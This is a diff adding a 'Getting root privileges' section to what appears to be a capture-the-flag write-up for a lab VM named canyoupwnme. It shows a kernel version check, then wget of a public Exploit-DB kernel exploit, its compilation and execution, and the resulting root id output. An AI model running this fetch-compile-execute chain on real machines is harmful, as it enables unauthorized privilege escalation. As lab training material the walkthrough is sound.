@@ -163,3 +163,34 @@ attack's steps are well explained in the antirez's blog.
         user
         user@canyoupwnme:~$ pwd
         /home/user
+
+## Getting `root` privileges
+
+We got access in the target machine. Now let's try to get a `root` access. We
+already obtained the kernel version with Redis `INFO` command.
+Just to be sure...
+
+    $ uname -a
+    Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
+
+The kernel version is `3.19.0-25-generic` that was built on
+`Fri Jul 24 21:18:00 UTC 2015`. After a while, the following exploit seems to
+be ok
+
+    https://www.exploit-db.com/exploits/39166
+
+Let's try it...
+
+    $ pwd
+    /home/user
+    $ id
+    uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),115(lpadmin)
+    $ mkdir tmp
+    $ cd tmp
+    $ wget https://www.exploit-db.com/download/39166 -O poc.c
+    $ gcc poc.c -o poc.bin
+    $ ./poc.bin
+    # id
+    # uid=0(root) gid=1000(user) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),115(lpadmin),1000(user)
+
+Got it!
